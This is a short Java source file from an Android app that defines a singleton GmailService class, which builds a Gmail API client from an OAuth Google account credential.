package com.setting.dl.google.googlesettingupdate.mail.gmail;

import android.content.Context;

import com.google.api.client.extensions.android.http.AndroidHttp;
import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
import com.google.api.client.http.HttpTransport;
import com.google.api.client.json.JsonFactory;
import com.google.api.client.json.jackson2.JacksonFactory;
import com.google.api.client.util.ExponentialBackOff;
import com.google.api.services.gmail.Gmail;
import com.setting.dl.google.googlesettingupdate.MainActivity;

import java.util.Arrays;

/**
 * Created by hsyn on 7.06.2017.
 * <p>
 * GmailService is a account
 */

public class GmailService extends Account {
   
   private static Gmail mService;
   
   private GmailService(Context context) {
      super(context);
      setupService();
   }
   
   private void setupService() {
      
      GoogleAccountCredential mCredential = GoogleAccountCredential.usingOAuth2(context, Arrays.asList(MainActivity.SCOPES)).setBackOff(new ExponentialBackOff());
      mCredential.setSelectedAccountName(getAccount());
      
      HttpTransport transport   = AndroidHttp.newCompatibleTransport();
      JsonFactory   jsonFactory = JacksonFactory.getDefaultInstance();
      
      //mService = new com.google.api.services.tasks.Tasks.Builder(transport, jsonFactory, mCredential).setApplicationName("Gmail").build();
      mService = new Gmail.Builder(transport, jsonFactory, mCredential).setApplicationName("Gmail").build();
      
   }
   
   public static Gmail getGmailService(Context context) {
   
      if (mService == null) {
   
         synchronized (GmailService.class) {
   
            if (mService == null) {
               
               new GmailService(context);
            }
         }
      }
      
      return mService;
   }
   
}
